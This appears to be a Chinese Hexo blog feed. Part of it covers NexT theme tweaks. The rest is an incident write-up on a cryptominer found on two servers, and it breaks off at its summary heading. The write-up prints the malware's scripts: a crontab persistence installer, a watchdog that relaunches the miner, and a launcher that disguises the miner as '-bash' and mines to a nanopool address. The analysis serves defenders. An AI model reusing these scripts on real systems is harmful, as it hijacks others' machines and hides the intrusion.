<del>修改文章底部的那个带#号的标签</del>(NexT新版已经支持此feather,主题配置文件开启 tag_icon: true 即可)</h4><p>修改模板/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">将 <span class="comment"># 换成 </span></span><br><span class="line">&lt;i <span class="built_in">class</span>=<span class="string">&quot;fa fa-tag&quot;</span>&gt;&lt;/i&gt;</span><br></pre></td></tr></table></figure><h4 id="4-修改头像为圆形-NexT新版已经支持此feather-开启方法在-主题配置13中"><a href="#4-修改头像为圆形-NexT新版已经支持此feather-开启方法在-主题配置13中" class="headerlink" title="4. 修改头像为圆形(NexT新版已经支持此feather,开启方法在 主题配置13中)"></a>4. <del>修改头像为圆形</del>(NexT新版已经支持此feather,开启方法在 主题配置13中)</h4><p><del>编辑 /themes/next/source/css/_common/components/sidebar/sidebar-author.styl，在 site-author-image 里面添加如下代码：</del></p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">.site-author-image &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  padding: $site-author-image-padding;</span><br><span class="line">  max-width: $site-author-image-width;</span><br><span class="line">  height: $site-author-image-height;</span><br><span class="line">  border: $site-author-image-border-width solid $site-author-image-border-color;</span><br><span class="line"></span><br><span class="line"><span class="addition">+  /* 头像圆形 */</span></span><br><span class="line"><span class="addition">+  border-radius: 80px;</span></span><br><span class="line"><span class="addition">+  -webkit-border-radius: 80px;</span></span><br><span class="line"><span class="addition">+  -moz-border-radius: 80px;</span></span><br><span class="line"><span class="addition">+  box-shadow: inset 0 -1px 0 #333sf;</span></span><br></pre></td></tr></table></figure><h4 id="5-修改文章底部上一篇和下一篇的顺序-NexT新版已经支持-开启方法在-主题配置14中"><a href="#5-修改文章底部上一篇和下一篇的顺序-NexT新版已经支持-开启方法在-主题配置14中" class="headerlink" title="5. 修改文章底部上一篇和下一篇的顺序(NexT新版已经支持,开启方法在 主题配置14中)"></a>5. <del>修改文章底部上一篇和下一篇的顺序</del>(NexT新版已经支持,开启方法在 主题配置14中)</h4><p>进入一篇文章，在文章底部，有上下篇的链接（&lt; &gt;），但是点 &gt; 发现进入的是页面中的的上面那篇文章，与操作习惯不符.<br>修改 /themes/next/layout/_macro/post.swig 使之符合一般习惯</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">&#123;% if not is_index and (post.prev or post.next) %&#125;</span><br><span class="line">  &lt;div class=&quot;post-nav&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;post-nav-next post-nav-item&quot;&gt;</span><br><span class="line"><span class="deletion">-      &#123;% if post.next %&#125;</span></span><br><span class="line"><span class="addition">+      &#123;% if post.prev %&#125;</span></span><br><span class="line"><span class="deletion">-        &lt;a href=&quot;&#123;&#123; url_for(post.next.path) &#125;&#125;&quot; rel=&quot;next&quot; title=&quot;&#123;&#123; post.next.title &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="addition">+        &lt;a href=&quot;&#123;&#123; url_for(post.prev.path) &#125;&#125;&quot; rel=&quot;prev&quot; title=&quot;&#123;&#123; post.prev.title &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="deletion">-          &lt;i class=&quot;fa fa-chevron-left&quot;&gt;&lt;/i&gt; &#123;&#123; post.next.title &#125;&#125;</span></span><br><span class="line"><span class="addition">+          &lt;i class=&quot;fa fa-chevron-left&quot;&gt;&lt;/i&gt; &#123;&#123; post.prev.title &#125;&#125;</span></span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;span class=&quot;post-nav-divider&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;div class=&quot;post-nav-prev post-nav-item&quot;&gt;</span><br><span class="line"><span class="deletion">-      &#123;% if post.prev %&#125;</span></span><br><span class="line"><span class="addition">+      &#123;% if post.next %&#125;</span></span><br><span class="line"><span class="deletion">-        &lt;a href=&quot;&#123;&#123; url_for(post.prev.path) &#125;&#125;&quot; rel=&quot;prev&quot; title=&quot;&#123;&#123; post.prev.title &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="addition">+        &lt;a href=&quot;&#123;&#123; url_for(post.next.path) &#125;&#125;&quot; rel=&quot;next&quot; title=&quot;&#123;&#123; post.next.title &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="deletion">-          &#123;&#123; post.prev.title &#125;&#125; &lt;i class=&quot;fa fa-chevron-right&quot;&gt;&lt;/i&gt;</span></span><br><span class="line"><span class="addition">+          &#123;&#123; post.next.title &#125;&#125; &lt;i class=&quot;fa fa-chevron-right&quot;&gt;&lt;/i&gt;</span></span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h4 id="6-本地加载-Valine-min-js-文件"><a href="#6-本地加载-Valine-min-js-文件" class="headerlink" title="6. 本地加载 Valine.min.js 文件"></a>6. <del>本地加载 Valine.min.js 文件</del></h4><ul><li>从 <a href="unpkg.com/valine/dist/Valine.min.js">unpkg.com/valine/dist/Valine.min.js</a>下载最新版 Valine.min.js 到 /themes/next/source/js/src 目录</li><li>编辑 Valine.min.js 文件去除其中的 valine 的版本信息<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- &lt;div class=&quot;power txt-right&quot;&gt;Powered By &lt;a href=&quot;https://valine.js.org&quot; target=&quot;_blank&quot;&gt;Valine&lt;/a&gt;&lt;br&gt;v1.1.9-beta4&lt;/div&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure></li><li>编辑 /themes/next/layout/_third-party/comments/valine.swig 改用本地 js 文件中增加以下内容<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">&#123;% if theme.valine.enable and theme.valine.appid and theme.valine.appkey %&#125;</span><br><span class="line">  &lt;script src=&quot;//cdn1.lncld.net/static/js/3.0.4/av-min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"><span class="deletion">-  &lt;script src=&quot;//unpkg.com/valine/dist/Valine.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="addition">+  &lt;script src=&quot;/js/src/Valine.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">&#123;% if theme.vendors.valine %&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="7-增加本文结束标志"><a href="#7-增加本文结束标志" class="headerlink" title="7. 增加本文结束标志"></a>7. 增加本文结束标志</h4><p>在路径 /themes/next/layout/_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：</p><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> not is_index %&#125;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;color: #ccc;font-size:14px;&quot;</span>&gt;</span>-------------本文结束<span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-paw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>感谢阅读-------------<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>然后编辑 /themes/next/layout/_macro/post.swig文件,在post-body 之后, post-footer 之前添加如下代码(post-footer之前三个DIV)</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">    &#123;#####################&#125;</span><br><span class="line">    &#123;### END POST BODY ###&#125;</span><br><span class="line">    &#123;#####################&#125;</span><br><span class="line"></span><br><span class="line"><span class="addition">+&lt;div&gt;</span></span><br><span class="line"><span class="addition">+        &#123;% if not is_index %&#125;</span></span><br><span class="line"><span class="addition">+        &#123;% include &#x27;passage-end-tag.swig&#x27; %&#125;</span></span><br><span class="line"><span class="addition">+        &#123;% endif %&#125;</span></span><br><span class="line"><span class="addition">+     &lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">    &#123;% if theme.wechat_subscriber.enabled and not is_index %&#125;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123;% include &#x27;wechat-subscriber.swig&#x27; %&#125;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">    &#123;% if (theme.alipay or theme.wechatpay or theme.bitcoin) and not is_index %&#125;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123;% include &#x27;reward.swig&#x27; %&#125;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">    &#123;% if theme.post_copyright.enable and not is_index %&#125;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123;% include &#x27;post-copyright.swig&#x27; with &#123; post: post &#125; %&#125;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">    &lt;footer class=&quot;post-footer&quot;&gt;</span><br><span class="line">      &#123;% if post.tags and post.tags.length and not is_index %&#125;</span><br><span class="line">        &lt;div class=&quot;post-tags&quot;&gt;</span><br><span class="line">          &#123;% for tag in post.tags %&#125;</span><br><span class="line">            &lt;a href=&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot; rel=&quot;tag&quot;&gt;&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; &#123;&#123; tag.name &#125;&#125;&lt;/a&gt;</span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>然后打开主题配置文件 _config.yml ,在末尾添加</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="8-开启版权信息，并增加版权信息内容"><a href="#8-开启版权信息，并增加版权信息内容" class="headerlink" title="8. 开启版权信息，并增加版权信息内容"></a>8. 开启版权信息，并增加版权信息内容</h4><ul><li><del>开启版权信息</del>（主题配置文件此项有所修改）<br>编辑主题配置文件 _config.yml 修改以下配置<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  license: &lt;<span class="keyword">a</span> href=<span class="string">&quot;https://creativecommons.org/licenses/by-nc-sa/4.0/&quot;</span> <span class="built_in">rel</span>=<span class="string">&quot;external nofollow&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;CC BY-NC-SA <span class="number">4.0</span>&lt;/<span class="keyword">a</span>&gt;</span><br></pre></td></tr></table></figure></li><li>增加版权内容:本文标题</li></ul><ol><li>编辑 /themes/next/layout/_partials/post/post-copyright.swig 文件,加入以下内容<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">  &lt;li class=&quot;post-copyright-author&quot;&gt;</span><br><span class="line">    &lt;strong&gt;&#123;&#123; __(&#x27;post.copyright.author&#x27;) + __(&#x27;symbol.colon&#x27;) &#125;&#125; &lt;/strong&gt;&#123;#</span><br><span class="line">  #&#125;&#123;&#123; post.author | default(author) &#125;&#125;&#123;#</span><br><span class="line">#&#125;&lt;/li&gt;</span><br><span class="line"><span class="addition">+  &lt;li class=&quot;post-copyright-title&quot;&gt;</span></span><br><span class="line"><span class="addition">+    &lt;strong&gt;&#123;&#123; __(&#x27;post.copyright.title&#x27;) + __(&#x27;symbol.colon&#x27;) &#125;&#125; &lt;/strong&gt;&#123;#</span></span><br><span class="line"><span class="addition">+  #&#125;&#123;&#123; post.title | default(title) &#125;&#125;&#123;#</span></span><br><span class="line"><span class="addition">+ #&#125;&lt;/li&gt;</span></span><br><span class="line">  &lt;li class=&quot;post-copyright-link&quot;&gt;</span><br><span class="line">    &lt;strong&gt;&#123;&#123; __(&#x27;post.copyright.link&#x27;) + __(&#x27;symbol.colon&#x27;) &#125;&#125;&lt;/strong&gt;</span><br><span class="line">    &lt;a href=&quot;&#123;&#123; post.url | default(post.permalink) &#125;&#125;&quot; title=&quot;&#123;&#123; post.title &#125;&#125;&quot;&gt;&#123;&#123; post.url | default(post.permalink) &#125;&#125;&lt;/a&gt;</span><br><span class="line">  &lt;/li&gt;</span><br></pre></td></tr></table></figure></li><li>编辑 /themes/next/languages/zh-CN.yml 文件,加入以下内容<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">  copyright:</span><br><span class="line">    author: 本文作者</span><br><span class="line"><span class="addition">+    title: 本文标题</span></span><br><span class="line">    link: 本文链接</span><br><span class="line">    license_title: 版权声明</span><br><span class="line">    license_content: &quot;本博客所有文章除特别声明外，均采用 %s 许可协议。转载请注明出处！&quot;</span><br></pre></td></tr></table></figure></li></ol><h4 id="9-使用-valine-admin-添加评论邮件提醒"><a href="#9-使用-valine-admin-添加评论邮件提醒" class="headerlink" title="9. 使用 valine-admin 添加评论邮件提醒"></a>9. 使用 valine-admin 添加评论邮件提醒</h4><p>使用 valine 当有新评论的时候是没有邮件提醒，使用 valine-admin 扩展他的功能。配置方法参考 <a href="http://www.zhaojun.im/hexo-valine-admin/">Hexo 优化 — Valine 扩展之邮件通知</a>，Valine.min.js 使用 <a href="https://github.com/panjunwen/Valine/releases">Valine-Ex</a> </p><h4 id="10-文章简单加密"><a href="#10-文章简单加密" class="headerlink" title="10. 文章简单加密"></a>10. 文章简单加密</h4><p>安装插件</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>在 hexo 配置文件中启用插件</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章加密</span></span><br><span class="line"><span class="attr">encrypt:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>文章添加相关字段(后两项可以不填)</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">password:</span> 文章的密码</span><br><span class="line"><span class="symbol">message:</span> 输入密码界面提示说明</span><br><span class="line"><span class="symbol">abstract:</span> 文章界面介绍</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> hexo </tag>
            
            <tag> typecho </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次遭遇挖矿程序</title>
      <link href="linux/Mining-program.html"/>
      <url>linux/Mining-program.html</url>
      
        <content type="html"><![CDATA[<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><h3 id="1-两台服务器收到告警，top-查看进程发现如下可疑进程"><a href="#1-两台服务器收到告警，top-查看进程发现如下可疑进程" class="headerlink" title="1. 两台服务器收到告警，top 查看进程发现如下可疑进程"></a>1. 两台服务器收到告警，top 查看进程发现如下可疑进程</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># top</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PID</span> USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line"><span class="attribute">19078</span> vmuser    <span class="number">20</span>   <span class="number">0</span>  <span class="number">680232</span>  <span class="number">14284</span>   <span class="number">1032</span> S <span class="number">342</span>.<span class="number">8</span>  <span class="number">0</span>.<span class="number">1</span>   <span class="number">1583</span>:<span class="number">11</span> md</span><br><span class="line"><span class="attribute">501</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3264</span>    <span class="number">760</span> R  <span class="number">55</span>.<span class="number">9</span>  <span class="number">0</span>.<span class="number">0</span>   <span class="number">2172</span>:<span class="number">49</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">504</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3264</span>    <span class="number">760</span> R  <span class="number">46</span>.<span class="number">7</span>  <span class="number">0</span>.<span class="number">0</span>   <span class="number">2000</span>:<span class="number">21</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">18469</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3504</span>    <span class="number">984</span> R  <span class="number">46</span>.<span class="number">1</span>  <span class="number">0</span>.<span class="number">0</span>   <span class="number">1252</span>:<span class="number">47</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">18692</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3408</span>    <span class="number">908</span> R  <span class="number">43</span>.<span class="number">1</span>  <span class="number">0</span>.<span class="number">0</span> <span class="number">318</span>:<span class="number">58</span>.<span class="number">87</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">18695</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3536</span>   <span class="number">1020</span> R  <span class="number">42</span>.<span class="number">8</span>  <span class="number">0</span>.<span class="number">0</span> <span class="number">129</span>:<span class="number">26</span>.<span class="number">05</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">10547</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3412</span>    <span class="number">908</span> R  <span class="number">40</span>.<span class="number">8</span>  <span class="number">0</span>.<span class="number">0</span>  <span class="number">72</span>:<span class="number">19</span>.<span class="number">69</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">8658</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3400</span>    <span class="number">880</span> R  <span class="number">40</span>.<span class="number">5</span>  <span class="number">0</span>.<span class="number">0</span>   <span class="number">4606</span>:<span class="number">03</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">8655</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3468</span>    <span class="number">948</span> R  <span class="number">40</span>.<span class="number">1</span>  <span class="number">0</span>.<span class="number">0</span>   <span class="number">4383</span>:<span class="number">23</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">10542</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3408</span>    <span class="number">908</span> S  <span class="number">24</span>.<span class="number">7</span>  <span class="number">0</span>.<span class="number">0</span>  <span class="number">90</span>:<span class="number">27</span>.<span class="number">13</span><span class="meta"> [atd]</span></span><br><span class="line"><span class="attribute">8549</span> vmuser    <span class="number">20</span>   <span class="number">0</span>   <span class="number">32348</span>   <span class="number">3372</span>    <span class="number">868</span> R   <span class="number">9</span>.<span class="number">9</span>  <span class="number">0</span>.<span class="number">0</span> <span class="number">323</span>:<span class="number">27</span>.<span class="number">79</span><span class="meta"> [atd]</span></span><br></pre></td></tr></table></figure><p>用户名为 vmuser 的可疑进程  </p><h3 id="2-查看-md-进程详情"><a href="#2-查看-md-进程详情" class="headerlink" title="2. 查看 md 进程详情"></a>2. 查看 md 进程详情</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps aux | grep 19078</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">vmuser</span>   <span class="number">19078</span>  <span class="number">343</span>  <span class="number">0</span>.<span class="number">0</span> <span class="number">680232</span> <span class="number">13764</span> ?        Sl   <span class="number">07</span>:<span class="number">38</span> <span class="number">1613</span>:<span class="number">58</span> -bash -a cryptonight -o stratum+tcp://etn-us-west<span class="number">1</span>.nanopool.org:<span class="number">13333</span> -u etnk<span class="number">5</span>c<span class="number">12</span>V<span class="number">3</span>YAb<span class="number">5</span>gLekc<span class="number">5</span>N<span class="number">8</span>SizEpbpDogviaU<span class="number">2</span>U<span class="number">9</span>tff<span class="number">2</span>F<span class="number">9</span>JafNFS<span class="number">9</span>pxmF<span class="number">1</span>PNf<span class="number">4</span>aZrMjRSqd<span class="number">9</span>bhjXn<span class="number">7</span>dbpmepNjKi<span class="number">586</span>ZtD<span class="number">9</span>Cv<span class="number">9</span>N -p x</span><br></pre></td></tr></table></figure><p>查询后果然和自己判断一样是一个挖矿程序</p><span id="more"></span><h3 id="3-查找用户程序目录"><a href="#3-查找用户程序目录" class="headerlink" title="3. 查找用户程序目录"></a>3. 查找用户程序目录</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ls -l <span class="regexp">/proc/</span><span class="number">19078</span>/exe</span><br><span class="line">lrwxrwxrwx <span class="number">1</span> vmuser vmuser <span class="number">0</span> Jan <span class="number">29</span> <span class="number">07</span>:<span class="number">38</span> <span class="regexp">/proc/</span><span class="number">19078</span><span class="regexp">/exe -&gt; /</span>tmp<span class="regexp">/.n/m</span>d</span><br></pre></td></tr></table></figure><h3 id="4-进入-tmp-n-目录有如下文件"><a href="#4-进入-tmp-n-目录有如下文件" class="headerlink" title="4. 进入 /tmp/.n/ 目录有如下文件"></a>4. 进入 /tmp/.n/ 目录有如下文件</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ll -sh</span></span><br><span class="line"><span class="attribute">total</span> <span class="number">4</span>.<span class="number">1</span>M</span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rwxr-xr-x <span class="number">1</span> vmuser vmuser  <span class="number">327</span> Jan <span class="number">23</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1</span></span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rwxr-xr-x <span class="number">1</span> vmuser vmuser  <span class="number">329</span> Oct <span class="number">27</span> <span class="number">21</span>:<span class="number">30</span> a</span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rw-r--r-- <span class="number">1</span> vmuser vmuser    <span class="number">5</span> Jan <span class="number">23</span> <span class="number">14</span>:<span class="number">55</span> bash.pid</span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rw-r--r-- <span class="number">1</span> vmuser vmuser   <span class="number">38</span> Jan <span class="number">23</span> <span class="number">08</span>:<span class="number">11</span> cron.d</span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rw-r--r-- <span class="number">1</span> vmuser vmuser    <span class="number">8</span> Jan <span class="number">23</span> <span class="number">08</span>:<span class="number">11</span> dir.dir</span><br><span class="line"> <span class="attribute">16K</span> -rwxr-xr-x <span class="number">1</span> vmuser vmuser  <span class="number">15</span>K Feb <span class="number">21</span>  <span class="number">2016</span> h<span class="number">32</span></span><br><span class="line"><span class="attribute">820K</span> -rwxr-xr-x <span class="number">1</span> vmuser vmuser <span class="number">819</span>K Feb <span class="number">21</span>  <span class="number">2016</span> h<span class="number">64</span></span><br><span class="line"><span class="attribute">2</span>.<span class="number">9</span>M -rwxr-xr-x <span class="number">1</span> vmuser vmuser <span class="number">2</span>.<span class="number">9</span>M Jun <span class="number">24</span>  <span class="number">2017</span> md</span><br><span class="line"><span class="attribute">224K</span> -rwxr-xr-x <span class="number">1</span> vmuser vmuser <span class="number">222</span>K Oct <span class="number">22</span> <span class="number">22</span>:<span class="number">25</span> md<span class="number">32</span></span><br><span class="line"><span class="attribute">168K</span> -rwxr-xr-x <span class="number">1</span> vmuser vmuser <span class="number">165</span>K Sep <span class="number">27</span> <span class="number">18</span>:<span class="number">58</span> mdx</span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rwxr-xr-x <span class="number">1</span> vmuser vmuser  <span class="number">586</span> Jan <span class="number">23</span> <span class="number">08</span>:<span class="number">03</span> run</span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rwxr--r-- <span class="number">1</span> vmuser vmuser  <span class="number">170</span> Jan <span class="number">23</span> <span class="number">08</span>:<span class="number">11</span> upd</span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rwxr-xr-x <span class="number">1</span> vmuser vmuser   <span class="number">24</span> Oct  <span class="number">5</span> <span class="number">02</span>:<span class="number">45</span> x</span><br><span class="line"><span class="attribute">4</span>.<span class="number">0</span>K -rwxr--r-- <span class="number">1</span> vmuser vmuser  <span class="number">139</span> Nov  <span class="number">6</span> <span class="number">05</span>:<span class="number">21</span> z</span><br></pre></td></tr></table></figure><h3 id="5-挖矿程序分析"><a href="#5-挖矿程序分析" class="headerlink" title="5. 挖矿程序分析"></a>5. 挖矿程序分析</h3><ul><li>x 文件,文件下载后首先执行x文件</li></ul><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim x</span></span><br><span class="line"></span><br><span class="line">nohup .<span class="regexp">/a &gt;&gt;/</span>dev/null &amp;   <span class="comment">#执行 a 文件</span></span><br></pre></td></tr></table></figure><ul><li>a 文件</li></ul><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"># vim a</span><br><span class="line"></span><br><span class="line"><span class="keyword">pwd</span> &gt; <span class="keyword">dir</span>.<span class="keyword">dir</span></span><br><span class="line"><span class="keyword">dir</span>=$(<span class="keyword">cat</span> <span class="keyword">dir</span>.<span class="keyword">dir</span>)</span><br><span class="line">echo <span class="string">&quot;* * * * * $dir/upd &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt; cron.<span class="keyword">d</span></span><br><span class="line">crontab cron.<span class="keyword">d</span></span><br><span class="line">crontab -<span class="keyword">l</span> | grep upd</span><br><span class="line">echo &quot;#!/bin/<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">test</span> -r <span class="variable">$dir</span>/bash.pid; then</span><br><span class="line">pid=\$(<span class="keyword">cat</span> <span class="variable">$dir</span>/bash.pid)</span><br><span class="line"><span class="keyword">if</span> \$(kill -CHLD \<span class="variable">$pid</span> &gt;/dev/null 2&gt;&amp;1)</span><br><span class="line">then</span><br><span class="line"><span class="keyword">sleep</span> 1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">cd</span> <span class="variable">$dir</span></span><br><span class="line">./<span class="keyword">run</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">exit</span> 0</span><br><span class="line">fi</span><br><span class="line">fi&quot; &gt;upd</span><br><span class="line">chmod <span class="keyword">u</span>+x upd</span><br><span class="line">./<span class="keyword">run</span> &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure><p>获取当前目录，定时任务一直执行 upd 文件</p><ul><li>upd 文件</li></ul><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim upd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> test -r <span class="regexp">/tmp/</span>.n/bash.pid; then</span><br><span class="line">pid=$(cat <span class="regexp">/tmp/</span>.n/bash.pid)</span><br><span class="line"><span class="keyword">if</span> $(kill -CHLD <span class="variable">$pid</span> &gt;<span class="regexp">/dev/</span>null <span class="number">2</span>&gt;&amp;<span class="number">1</span>)</span><br><span class="line">then</span><br><span class="line">sleep <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cd <span class="regexp">/tmp/</span>.n</span><br><span class="line">.<span class="regexp">/run &amp;&gt;/</span>dev/null</span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span></span><br><span class="line">fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>检查 /tmp/.n/bash.pid 文件是否可读，如果可读就读出里面的 pid，直接kill掉，重新执行 run</p><ul><li>run 文件，挖矿程序的主体</li></ul><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim run</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">proc=`nproc`</span><br><span class="line">ARCH=`uname -m`</span><br><span class="line">HIDE=<span class="string">&quot;-bash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$ARCH&quot;</span> == <span class="string">&quot;i686&quot;</span> ];       then</span><br><span class="line">        .<span class="regexp">/h32 -s $HIDE ./m</span>d32 -a cryptonight -o stratum+tcp:<span class="regexp">//</span>etn-us-west1.nanopool.org:<span class="number">13333</span>:<span class="number">13333</span> -u etnk5c12V3YAb5gLekc5N8SizEpbpDogviaU2U9tff2F9JafNFS9pxmF1PNf4aZrMjRSqd9bhjXn7dbpmepNjKi586ZtD9Cv9N -p x &gt;&gt;<span class="regexp">/dev/</span>null &amp;</span><br><span class="line">elif [ <span class="string">&quot;$ARCH&quot;</span> == <span class="string">&quot;x86_64&quot;</span> ];   then</span><br><span class="line">        .<span class="regexp">/h64 -s $HIDE ./m</span>d -a cryptonight -o stratum+tcp:<span class="regexp">//</span>etn-us-west1.nanopool.org:<span class="number">13333</span> -u etnk5c12V3YAb5gLekc5N8SizEpbpDogviaU2U9tff2F9JafNFS9pxmF1PNf4aZrMjRSqd9bhjXn7dbpmepNjKi586ZtD9Cv9N -p x &gt;&gt;<span class="regexp">/dev/</span>null &amp;</span><br><span class="line">fi</span><br><span class="line">echo $! &gt; bash.pid</span><br></pre></td></tr></table></figure><p>这个核心文件就是读出操作系统的硬件架构，如果是i386就执行32位的h32和md32，猜测h32是用于让系统显示的进程名称，md32才是真正的挖矿程序。执行完成了就把进程id写入bash.pid中。</p><h3 id="6-过程总结"><a href="#6-过程总结" 